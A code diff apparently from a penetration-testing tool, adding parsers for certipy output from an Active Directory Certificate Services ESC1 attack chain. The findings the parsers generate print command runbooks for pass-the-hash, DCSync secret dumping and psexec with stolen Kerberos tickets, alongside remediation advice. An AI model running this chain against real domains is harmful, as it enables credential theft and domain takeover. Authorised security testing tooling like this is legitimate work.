@@ -1616,6 +1616,182 @@ class CardADParserMixin:
             "success")
         return True
 
+    def _parse_certipy_req_to_intel(self, tool, log: list) -> bool:
+        """certipy req — obtained a certificate impersonating a
+        privileged user via an ESC1 template.
+
+        The .pfx authenticates AS that user, so this is a HIGH finding
+        that names the impersonated identity and — crucially — the
+        ACTUAL path certipy wrote the .pfx to (certipy v5 sanitises path
+        separators in -out, so the file is often NOT where -out pointed).
+        Returns False when no cert was issued so real errors fall through
+        to the generic fallback.
+        """
+        import re
+        from utils.run_id import new_run_id
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+
+        if ("successfully requested certificate" not in text.lower()
+                and "got certificate" not in text.lower()):
+            return False
+
+        m_upn = re.search(r"Got certificate with UPN '([^']+)'", text)
+        upn = m_upn.group(1).strip() if m_upn else "the requested user"
+        m_pfx = (re.search(r"Wrote certificate and private key to "
+                           r"'([^']+)'", text)
+                 or re.search(r"Saving certificate and private key to "
+                              r"'([^']+)'", text))
+        pfx = m_pfx.group(1).strip() if m_pfx else "the .pfx printed above"
+        no_sid = "no object sid" in text.lower()
+
+        sid_note = (
+            "\nNote: the certificate has NO object SID (certipy could not "
+            "resolve it — usually a DNS failure to the domain).  On DCs "
+            "patched for CVE-2022-26923 you must re-run req with "
+            "'-sid <the target user's SID>'; on unpatched / legacy DCs UPN "
+            "mapping still authenticates.\n"
+            if no_sid else "")
+
+        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
+            title=f"CERTIPY REQ — certificate obtained for {upn} on "
+                  f"{target}",
+            description=(
+                f"Abused an ESC1 template to enrol a certificate that "
+                f"authenticates AS {upn} — a low-privileged user just "
+                f"minted a logon certificate for a privileged account.\n\n"
+                f"Impersonated : {upn}\n"
+                f"Cert (.pfx)  : {pfx}\n"
+                f"{sid_note}\n"
+                f"Next step — turn the cert into a TGT + the NT hash "
+                f"(PKINIT / UnPAC-the-hash):\n"
+                f"  certipy auth -pfx '{pfx}' -dc-ip <DC-IP>\n"
+                f"  (Kerberos: needs the DC FQDN resolvable and the clock "
+                f"in sync — on a lab add the DC to /etc/hosts and "
+                f"ntpdate it.)\n\n"
+                f"Remediation:\n"
+                f"  Remove ENROLLEE_SUPPLIES_SUBJECT from the template (or "
+                f"require manager approval), restrict enrolment to trusted "
+                f"principals, and enable strong certificate mapping "
+                f"(KB5014754)."),
+            severity="high", source=tool.name,
+            linked_run_id=rid))
+        self.app.terminal.write(
+            f"  [+] certipy req — cert for {upn} at {pfx} -> "
+            f"Target Intel.", "success")
+        return True
+
+    def _parse_certipy_auth_to_intel(self, tool, log: list) -> bool:
+        """certipy auth — the payoff of the AD CS ESC1 chain.
+
+        PKINIT-authenticates with the ESC1 .pfx and UnPAC's the target's
+        NT hash.  Recovering a privileged account's hash this way is
+        effectively domain compromise, so we push the hash to the
+        Credential Store (verified=False — recovered, not NTLM-logged-in
+        by HAWK) and raise a CRITICAL finding with the pass-the-hash /
+        DCSync runbook.  Returns False when auth failed (no TGT, no hash)
+        so the real Kerberos error falls through to the generic fallback.
+        """
+        import re
+        from utils.session import Credential
+        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+        low = text.lower()
+
+        m_hash = re.search(
+            r"Got hash for '([^']+)':\s*"
+            r"([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", text)
+        m_ccache = re.search(r"credential cache to '([^']+)'", text)
+        ccache = m_ccache.group(1).strip() if m_ccache else ""
+        got_tgt = "got tgt" in low or bool(ccache)
+
+        if not m_hash and not got_tgt:
+            return False
+
+        if m_hash:
+            who = m_hash.group(1).strip()          # user@realm
+            full_hash = m_hash.group(2).strip()    # LM:NT
+            nt = full_hash.split(":")[-1]
+            uname = who.split("@")[0]
+            try:
+                self.app.cred_store.add_credential(Credential(
+                    username=uname,
+                    password="",
+                    hash_val=full_hash,
+                    hash_type="NTLM",
+                    cred_type="hash",
+                    services=["AD", "SMB", "WINRM"],
+                    source_phase=self.phase_id,
+                    host=target,
+                    notes=(f"NT hash recovered via AD CS ESC1 -> certipy "
+                           f"auth (PKINIT UnPAC-the-hash) for {who}.\n"
+                           f"Pass-the-hash / DCSync / golden ticket from "
+                           f"here."),
+                    linked_run_id=rid,
+                    category=TOOL_RUN_CATEGORY,
+                    verified=False))
+            except Exception as e:
+                print(f"[HAWK] certipy auth cred push failed: {e}")
+
+            tgt_line = f"TGT      : {ccache}\n" if ccache else ""
+            krbcc = ccache or "<user>.ccache"
+            _title = (f"CERTIPY AUTH — {uname} NT hash via ESC1 on "
+                      f"{target}")
+            _desc = (
+                f"Full AD CS ESC1 chain completed: a low-privileged user "
+                f"minted a certificate for {who}, PKINIT-authenticated, "
+                f"and UnPAC'd the account's NT hash — effectively domain "
+                f"compromise when the account is privileged.\n\n"
+                f"Account  : {who}\n"
+                f"NT hash  : {full_hash}\n"
+                f"{tgt_line}\n"
+                f"Use the hash:\n"
+                f"  Pass-the-hash: nxc smb <DC-IP> -u '{uname}' -H {nt}\n"
+                f"  DCSync every secret: impacket-secretsdump -hashes "
+                f":{nt} '<DOMAIN>/{uname}@<DC-IP>'\n"
+                f"  Or the TGT directly: export KRB5CCNAME={krbcc}; "
+                f"klist; impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+                f"'<DOMAIN>/{uname}@<DC-FQDN>'\n\n"
+                f"Remediation:\n"
+                f"  Fix the ESC1 template (remove ENROLLEE_SUPPLIES_"
+                f"SUBJECT or require manager approval), enable strong "
+                f"certificate mapping (KB5014754), and rotate {uname}'s "
+                f"credentials.")
+            self.app.after(0, lambda:
+                self.app.target_intel.add_auto_finding(
+                    title=_title, description=_desc,
+                    severity="critical", source=tool.name,
+                    linked_run_id=rid))
+            self.app.terminal.write(
+                f"  [+] certipy auth — {uname} NT hash -> Credential "
+                f"Store + Target Intel.", "success")
+            return True
+
+        # TGT obtained but no hash printed — still a valid PKINIT auth.
+        krbcc = ccache or "<user>.ccache"
+        self.app.after(0, lambda:
+            self.app.target_intel.add_auto_finding(
+                title=f"CERTIPY AUTH — TGT obtained on {target}",
+                description=(
+                    f"certipy auth PKINIT-authenticated with the ESC1 "
+                    f"certificate and obtained a TGT (saved to {krbcc}), "
+                    f"but printed no NT hash.\n\n"
+                    f"Use the ticket:\n"
+                    f"  export KRB5CCNAME={krbcc}; klist\n"
+                    f"  impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+                    f"'<DOMAIN>/<user>@<DC-FQDN>'"),
+                severity="high", source=tool.name,
+                linked_run_id=rid))
+        self.app.terminal.write(
+            "  [+] certipy auth — TGT obtained -> Target Intel.",
+            "success")
+        return True
+
     def _parse_bloodhound_to_intel(self, tool, log: list) -> bool:
         """bloodhound-python ZIP parser — extracts the .zip produced
         in the session-scoped output dir (set up by _run_raw), reads
